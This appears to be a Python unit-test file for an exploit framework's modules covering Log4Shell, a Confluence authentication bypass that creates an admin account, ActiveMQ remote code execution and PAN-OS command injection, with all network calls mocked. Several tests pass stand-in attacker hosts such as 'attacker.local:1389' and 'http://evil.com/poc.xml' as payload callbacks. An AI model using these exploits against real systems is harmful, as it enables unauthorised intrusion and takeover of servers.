"""Tests for CVE exploit modules (modules/dynamic_exploits/)."""

from __future__ import annotations

import importlib
from unittest.mock import MagicMock, patch


def _load_cve(name: str):
    """Import a CVE module by its dashed filename (e.g. 'CVE-2021-44228')."""
    return importlib.import_module(f"modules.dynamic_exploits.{name}")


# ---------------------------------------------------------------------------
# CVE-2021-44228 (Log4Shell)
# ---------------------------------------------------------------------------

_MOD_44228 = "CVE-2021-44228"


class TestCVE202144228:
    """Tests for the Log4Shell exploit module."""

    def test_import(self):
        """Module is importable."""
        mod = _load_cve(_MOD_44228)
        assert hasattr(mod, "exploit")

    def test_injection_headers_defined(self):
        mod = _load_cve(_MOD_44228)
        assert len(mod._INJECTION_HEADERS) >= 4
        assert "User-Agent" in mod._INJECTION_HEADERS

    def test_payload_variants(self):
        mod = _load_cve(_MOD_44228)
        for variant in mod._PAYLOAD_VARIANTS:
            assert "%s" in variant  # callback_host placeholder

    @patch("requests.get")
    def test_exploit_sends_payloads(self, mock_get: MagicMock):
        """Exploit sends requests for each header × variant combination."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_get.return_value = mock_resp

        mod = _load_cve(_MOD_44228)
        # Patch at module level
        orig = mod.requests.get
        mod.requests.get = mock_get
        try:
            result = mod.exploit("http://target:8080/app", "attacker.local:1389")
        finally:
            mod.requests.get = orig

        assert result["cve"] == "CVE-2021-44228"
        assert result["payloads_sent"] > 0
        assert result["vulnerable"] is True
        assert mock_get.call_count > 0

    def test_exploit_handles_errors(self):
        """Exploit catches request exceptions gracefully."""
        import requests as _req

        mock_get = MagicMock(side_effect=_req.ConnectionError("refused"))
        mod = _load_cve(_MOD_44228)
        orig = mod.requests.get
        mod.requests.get = mock_get
        try:
            result = mod.exploit("http://target/", "attacker:1389")
        finally:
            mod.requests.get = orig
        assert result["vulnerable"] is False
        assert len(result["errors"]) > 0

    def test_exploit_no_obfuscation(self):
        """Without obfuscation only one payload variant per header."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_get = MagicMock(return_value=mock_resp)

        mod = _load_cve(_MOD_44228)
        orig = mod.requests.get
        mod.requests.get = mock_get
        try:
            result = mod.exploit("http://t/", "a:1", use_obfuscation=False)
        finally:
            mod.requests.get = orig
        assert result["payloads_sent"] == len(mod._INJECTION_HEADERS)


# ---------------------------------------------------------------------------
# CVE-2023-22515 (Confluence Auth Bypass)
# ---------------------------------------------------------------------------

_MOD_22515 = "CVE-2023-22515"


class TestCVE202322515:
    """Tests for Confluence authentication bypass exploit module."""

    def test_import(self):
        mod = _load_cve(_MOD_22515)
        assert hasattr(mod, "check")
        assert hasattr(mod, "exploit")

    def test_check_vulnerable(self):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "<html>setup wizard</html>"
        mock_get = MagicMock(return_value=mock_resp)

        mod = _load_cve(_MOD_22515)
        orig = mod.requests.get
        mod.requests.get = mock_get
        try:
            result = mod.check("http://confluence.local")
        finally:
            mod.requests.get = orig
        assert result["vulnerable"] is True
        assert result["cve"] == "CVE-2023-22515"

    def test_check_not_vulnerable(self):
        mock_resp = MagicMock()
        mock_resp.status_code = 403
        mock_resp.text = "Forbidden"
        mock_get = MagicMock(return_value=mock_resp)

        mod = _load_cve(_MOD_22515)
        orig = mod.requests.get
        mod.requests.get = mock_get
        try:
            result = mod.check("http://confluence.local")
        finally:
            mod.requests.get = orig
        assert result["vulnerable"] is False

    def test_check_error_handling(self):
        import requests as _req

        mock_get = MagicMock(side_effect=_req.Timeout("timed out"))

        mod = _load_cve(_MOD_22515)
        orig = mod.requests.get
        mod.requests.get = mock_get
        try:
            result = mod.check("http://confluence.local")
        finally:
            mod.requests.get = orig
        assert result["vulnerable"] is False
        assert "error" in result

    def test_exploit_creates_admin(self):
        mod = _load_cve(_MOD_22515)
        mock_session = MagicMock()
        trigger_resp = MagicMock(status_code=200)
        post_resp = MagicMock(status_code=302)
        login_resp = MagicMock(status_code=302)

        mock_session.get.return_value = trigger_resp
        mock_session.post.side_effect = [post_resp, login_resp]

        orig_cls = mod.requests.Session
        mod.requests.Session = MagicMock(return_value=mock_session)
        try:
            result = mod.exploit("http://confluence.local", username="hacker", password="P@ss!")
        finally:
            mod.requests.Session = orig_cls
        assert result["success"] is True
        assert result["credentials"]["username"] == "hacker"


# ---------------------------------------------------------------------------
# CVE-2023-46604 (ActiveMQ RCE) — file named CVE-2023-44228
# ---------------------------------------------------------------------------

_MOD_46604 = "CVE-2023-44228"


class TestCVE202346604:
    """Tests for ActiveMQ ClassInfo RCE exploit module."""

    def test_import(self):
        mod = _load_cve(_MOD_46604)
        assert hasattr(mod, "check")
        assert hasattr(mod, "exploit")
        assert hasattr(mod, "_build_exploit_payload")

    def test_build_payload_structure(self):
        mod = _load_cve(_MOD_46604)
        payload = mod._build_exploit_payload("http://evil.com/poc.xml")
        import struct

        frame_len = struct.unpack(">I", payload[:4])[0]
        assert frame_len == len(payload) - 4
        assert b"http://evil.com/poc.xml" in payload

    def test_check_activemq_detected(self):
        mod = _load_cve(_MOD_46604)
        sock = MagicMock()
        sock.recv.return_value = b"ActiveMQ\x00\x00\x00"
        mock_conn = MagicMock()
        mock_conn.__enter__ = MagicMock(return_value=sock)
        mock_conn.__exit__ = MagicMock(return_value=False)

        orig = mod.socket.create_connection
        mod.socket.create_connection = MagicMock(return_value=mock_conn)
        try:
            result = mod.check("10.0.0.1")
        finally:
            mod.socket.create_connection = orig
        assert result["vulnerable"] is True
        assert result["cve"] == "CVE-2023-46604"

    def test_check_connection_refused(self):
        mod = _load_cve(_MOD_46604)
        orig = mod.socket.create_connection
        mod.socket.create_connection = MagicMock(side_effect=OSError("refused"))
        try:
            result = mod.check("10.0.0.1")
        finally:
            mod.socket.create_connection = orig
        assert result["vulnerable"] is False
        assert "error" in result

    def test_exploit_sends_frame(self):
        mod = _load_cve(_MOD_46604)
        sock = MagicMock()
        sock.recv.side_effect = [b"ActiveMQ\x00", b"\x00\x01response"]
        mock_conn = MagicMock()
        mock_conn.__enter__ = MagicMock(return_value=sock)
        mock_conn.__exit__ = MagicMock(return_value=False)

        orig = mod.socket.create_connection
        mod.socket.create_connection = MagicMock(return_value=mock_conn)
        try:
            result = mod.exploit("10.0.0.1", "http://evil.com/poc.xml")
        finally:
            mod.socket.create_connection = orig
        assert result["success"] is True
        sock.sendall.assert_called_once()


# ---------------------------------------------------------------------------
# CVE-2024-3400 (PAN-OS GlobalProtect)
# ---------------------------------------------------------------------------

_MOD_3400 = "CVE-2024-3400"


class TestCVE20243400:
    """Tests for PAN-OS GlobalProtect command injection module."""

    def test_import(self):
        mod = _load_cve(_MOD_3400)
        assert hasattr(mod, "check")
        assert hasattr(mod, "exploit")

    def test_check_gp_not_found(self):
        mod = _load_cve(_MOD_3400)
        mock_resp = MagicMock(status_code=404)
        orig = mod.requests.get
        mod.requests.get = MagicMock(return_value=mock_resp)
        try:
            result = mod.check("https://fw.corp.local")
        finally:
            mod.requests.get = orig
        assert result["vulnerable"] is False

    def test_exploit_sends_command(self):
        mod = _load_cve(_MOD_3400)
        resp = MagicMock(status_code=200)
        orig = mod.requests.post
        mod.requests.post = MagicMock(return_value=resp)
        try:
            result = mod.exploit("https://fw.corp.local", "id")
        finally:
            mod.requests.post = orig
        assert result["success"] is True
        assert result["command"] == "id"

    def test_exploit_failure(self):
        import requests as _req

        mod = _load_cve(_MOD_3400)
        orig = mod.requests.post
        mod.requests.post = MagicMock(side_effect=_req.ConnectionError("unreachable"))
        try:
            result = mod.exploit("https://fw.corp.local", "id")
        finally:
            mod.requests.post = orig
        assert result["success"] is False
        assert "error" in result
